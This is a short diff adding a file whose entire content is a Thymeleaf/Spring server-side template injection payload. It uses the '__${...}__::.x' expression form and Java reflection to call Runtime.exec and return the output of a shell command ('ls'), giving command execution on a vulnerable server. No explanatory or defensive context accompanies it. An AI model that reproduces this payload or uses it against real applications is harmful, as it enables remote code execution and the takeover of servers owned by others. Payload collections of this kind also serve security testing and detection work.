@@ -1,0 +1,11 @@
+__${"".getClass().forName("java.util.Scanner")
+    .getConstructor("".getClass().forName("java.io.InputStream"))
+    .newInstance(
+        "".getClass().forName("java.lang.Runtime")
+            .getMethod("getRuntime")
+            .invoke(null)
+            .exec("ls")
+            .getInputStream()
+    )
+    .next()
+}__::.x
